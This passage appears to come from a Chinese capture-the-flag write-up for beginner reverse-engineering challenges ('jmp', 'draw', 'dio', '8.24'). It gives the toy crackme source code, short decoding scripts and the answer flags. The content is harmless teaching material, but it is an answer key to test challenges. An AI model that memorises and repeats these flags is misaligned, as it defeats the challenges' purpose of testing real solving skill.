      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no,this is not a flag\n&quot;</span>);
      getchar();
   &#125;
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 如果你想明确返回一个值，你可以在这里添加 return 0;  </span>
&#125;</code></pre>
<h1 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h1><p>签到题，打开IDA反编译就能看到flag<br>flag[Welcome_to_AGCTF]<br>源代码：</p>
<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span>  </span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;
   <span class="hljs-type">char</span> flag[MAX_PATH];
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入flag：&quot;</span>);
   <span class="hljs-built_in">fgets</span>(flag, <span class="hljs-built_in">sizeof</span>(flag), stdin);  <span class="hljs-comment">// 使用fgets代替gets_s  </span>
   flag[<span class="hljs-built_in">strcspn</span>(flag, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 将fgets读入的换行符替换为字符串结束符  </span>

   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(flag) &lt;= <span class="hljs-number">16</span>) &#123;
      <span class="hljs-built_in">MessageBoxW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;you wrong!!!&quot;</span>, <span class="hljs-string">L&quot;wrong&quot;</span>, MB_OK);
   &#125;
   <span class="hljs-keyword">else</span> &#123;
      <span class="hljs-built_in">MessageBoxW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;flag&#123;Welcome_to_AGCTF&#125;&quot;</span>, <span class="hljs-string">L&quot;true&quot;</span>, MB_OK);
   &#125;
   <span class="hljs-built_in">getchar</span>();  <span class="hljs-comment">// 在程序退出前等待用户输入  </span>
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 返回0表示程序正常退出  </span>
&#125;</code></pre>
<h1 id="draw"><a href="#draw" class="headerlink" title="draw"></a>draw</h1><p>pyc反编译，得到很长串代码，运行可知是画图程序，答案就是画图结果<br>根据提示，flag为拼音小写，故flag为flag[haimianbaobao]</p>
<h1 id="dio"><a href="#dio" class="headerlink" title="dio"></a>dio</h1><p>无壳，拖入64位IDA，F5反编译。此题直接按照题目顺序即可<br>源代码：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你知道dio吗？&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
<span class="hljs-type">char</span> w[] = <span class="hljs-string">&quot;ns!rv&amp;akz*mo(.&quot;</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">14</span>;i++)
&#123;
   
   w[i] = w[i]^i;

&#125;
<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">14</span>;i++)
&#123;
   w[i] = w[i] - <span class="hljs-number">3</span>;
&#125;
<span class="hljs-built_in">puts</span>(w);
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre>
<p>flag[ko no dio da! ]</p>
<h1 id="8-24"><a href="#8-24" class="headerlink" title="8.24"></a>8.24</h1><p>无壳，拖入64位IDA<br>思路是选取str8[]的前24位进行逆向解密<br>解密脚本：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-type">char</span> str8[] = <span class="hljs-string">&quot;Everythingnegativepressurechallengesisallanopportunityformetorise&quot;</span>;
   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">24</span>;i++)
   &#123;
      str8[i] = str8[i]<span class="hljs-number">-2</span>;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,str8[i]);
         &#125;
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>源代码：</p>
<pre><code class="hljs c">
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;男人 哈哈哈哈哈 什么我能说的？曼巴出去\n&quot;</span>);
   <span class="hljs-type">char</span> str1[] = <span class="hljs-string">&quot;laodawoxiangnilewuwuwu&quot;</span>;
   <span class="hljs-type">char</span> str2[] = <span class="hljs-string">&quot;nengyuanzhichengdiyidashou&quot;</span>;
   <span class="hljs-type">char</span> str3[] = <span class="hljs-string">&quot;sharkyeganle&quot;</span>;
   <span class="hljs-type">char</span> str4[] = <span class="hljs-string">&quot;qishinatianwochulemingdaosimin&quot;</span>;
   <span class="hljs-type">char</span> str5[] = <span class="hljs-string">&quot;kouyifuhuolaodakouerjiangliyigexiaobuding&quot;</span>;
   <span class="hljs-type">char</span> str6[] = <span class="hljs-string">&quot;zhishengjiyeganle&quot;</span>;
   <span class="hljs-type">char</span> str7[] = <span class="hljs-string">&quot;laodabiezhou&quot;</span>;
   <span class="hljs-type">char</span> str8[] = <span class="hljs-string">&quot;Everythingnegativepressurechallengesisallanopportunityformetorise&quot;</span>;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please choose a sentence:\n&quot;</span>);
   <span class="hljs-built_in">puts</span>(str1);

   <span class="hljs-built_in">puts</span>(str2);

   <span class="hljs-built_in">puts</span>(str3);

   <span class="hljs-built_in">puts</span>(str4);

   <span class="hljs-built_in">puts</span>(str5);

   <span class="hljs-built_in">puts</span>(str6);

   <span class="hljs-built_in">puts</span>(str7);

   <span class="hljs-built_in">puts</span>(str8);

   <span class="hljs-type">char</span> str0[] = <span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I hope you understand what I mean, and then you should know how many characters to take\n&quot;</span>);
   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(str0);i++)
   &#123;
      str0[i] = (str0[i] + <span class="hljs-number">1</span>)*<span class="hljs-number">2</span>/<span class="hljs-number">2</span>;
      str0[i] = str0[i] + <span class="hljs-number">1</span>;
   &#125;
   <span class="hljs-built_in">puts</span>(str0);
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>flag[Ctcpwrfglelce_rgtcnpcqqs]</p>
]]></content>
  </entry>
</search>
